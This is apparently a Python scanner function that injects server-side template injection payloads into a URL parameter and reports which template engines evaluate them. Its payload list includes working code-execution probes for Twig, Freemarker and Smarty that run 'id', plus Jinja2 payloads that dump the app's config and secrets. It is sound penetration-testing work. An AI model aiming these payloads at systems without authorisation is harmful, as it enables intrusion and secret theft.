"""test_ssti() — Server-Side Template Injection detection with multi-engine payloads."""

import json
import re
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from utils.http_client import get_client

# ---------------------------------------------------------------------------
# Payload sets per template engine
# ---------------------------------------------------------------------------

SSTI_PAYLOADS: list[dict] = [
    # Universal / detection
    {"payload": "{{7*7}}", "expect": "49", "engine": "Jinja2 / Twig / Generic"},
    {"payload": "${7*7}", "expect": "49", "engine": "Freemarker / Mako / EL"},
    {"payload": "<%= 7*7 %>", "expect": "49", "engine": "ERB (Ruby) / EJS"},
    {"payload": "#{7*7}", "expect": "49", "engine": "Pug / Slim / Expression Language"},
    {"payload": "${{7*7}}", "expect": "49", "engine": "Jinja2 (escaped) / Thymeleaf"},

    # Jinja2 specific
    {"payload": "{{config}}", "expect_pattern": r"<Config|SECRET_KEY|DEBUG", "engine": "Jinja2"},
    {"payload": "{{self.__class__.__mro__}}", "expect_pattern": r"class|object|tuple", "engine": "Jinja2"},
    {"payload": "{{request.application.__globals__}}", "expect_pattern": r"os|sys|builtins", "engine": "Jinja2"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "expect_pattern": r"subprocess|Popen|os", "engine": "Jinja2"},

    # Twig specific
    {"payload": "{{_self.env.display(\"id\")}}", "expect_pattern": r"uid=|root|www-data", "engine": "Twig"},

    # Freemarker specific
    {"payload": "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}", "expect_pattern": r"uid=|root", "engine": "Freemarker"},
    {"payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "expect_pattern": r"uid=|root", "engine": "Freemarker"},

    # Smarty (PHP)
    {"payload": "{php}echo 7*7;{/php}", "expect": "49", "engine": "Smarty (PHP)"},
    {"payload": "{system('id')}", "expect_pattern": r"uid=|root", "engine": "Smarty (PHP)"},

    # Velocity
    {"payload": "#set($x=7*7)$x", "expect": "49", "engine": "Apache Velocity"},

    # Handlebars
    {"payload": "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{this}}\n  {{/with}}\n{{/with}}", "expect_pattern": r"^e$", "engine": "Handlebars"},

    # Polyglot for detection
    {"payload": "{{7*'7'}}", "expect": "7777777", "engine": "Jinja2 (string multiplication)"},
    {"payload": "{{7*'7'}}", "expect": "49", "engine": "Twig (arithmetic)"},
]


def _inject_param_get(url: str, param: str, payload: str) -> str:
    """Inject payload into GET query-string parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _inject_body(data: str, param: str, payload: str) -> str:
    """Inject payload into URL-encoded POST body parameter."""
    params = parse_qs(data, keep_blank_values=True)
    params[param] = [payload]
    return urlencode(params, doseq=True)


async def test_ssti(
    url: str,
    param: str,
    method: str = "GET",
    data: str = "",
) -> str:
    """Test a parameter for Server-Side Template Injection (SSTI) vulnerabilities.

    Injects payloads targeting multiple template engines (Jinja2, Twig, Freemarker,
    ERB, Smarty, Velocity, etc.) and checks whether computed results appear in the
    response — indicating server-side template execution.

    Args:
        url: The target URL (for GET, include query string with the param).
        param: The parameter name to inject SSTI payloads into.
        method: HTTP method — "GET" or "POST" (default "GET").
        data: URL-encoded POST body (only for POST method).

    Returns:
        JSON string with findings, suspected engine, and confidence assessment.
    """
    method = method.upper()
    findings: list[dict] = []

    async with get_client(follow_redirects=True, verify_ssl=False) as client:
        for entry in SSTI_PAYLOADS:
            payload = entry["payload"]
            engine = entry["engine"]

            try:
                if method == "GET":
                    test_url = _inject_param_get(url, param, payload)
                    resp = await client.get(test_url)
                else:
                    injected = _inject_body(data, param, payload)
                    resp = await client.post(
                        url,
                        content=injected,
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                    )

                body = resp.text
                vulnerable = False
                match_detail = ""

                # Check exact expected value
                if "expect" in entry and entry["expect"] in body:
                    # Make sure it's not just the payload reflected literally
                    if payload not in body:
                        vulnerable = True
                        match_detail = f"Computed value '{entry['expect']}' found in response"
                    elif entry["expect"] in body.replace(payload, ""):
                        vulnerable = True
                        match_detail = f"Computed value '{entry['expect']}' found outside of reflected payload"

                # Check regex pattern
                if "expect_pattern" in entry:
                    pat = re.compile(entry["expect_pattern"], re.I)
                    if pat.search(body):
                        vulnerable = True
                        match_detail = f"Pattern '{entry['expect_pattern']}' matched in response"

                if vulnerable:
                    findings.append({
                        "payload": payload,
                        "engine": engine,
                        "status_code": resp.status_code,
                        "match": match_detail,
                        "vulnerable": True,
                    })

            except Exception:
                continue

    # Determine suspected engines
    engines_hit = list(set(f["engine"] for f in findings))
    if len(findings) == 0:
        confidence = "none"
    elif len(findings) <= 2:
        confidence = "low"
    elif len(findings) <= 5:
        confidence = "medium"
    else:
        confidence = "high"

    return json.dumps({
        "target": url,
        "param": param,
        "method": method,
        "total_payloads_tested": len(SSTI_PAYLOADS),
        "vulnerable_findings": len(findings),
        "confidence": confidence,
        "suspected_engines": engines_hit,
        "findings": findings,
    }, indent=2)
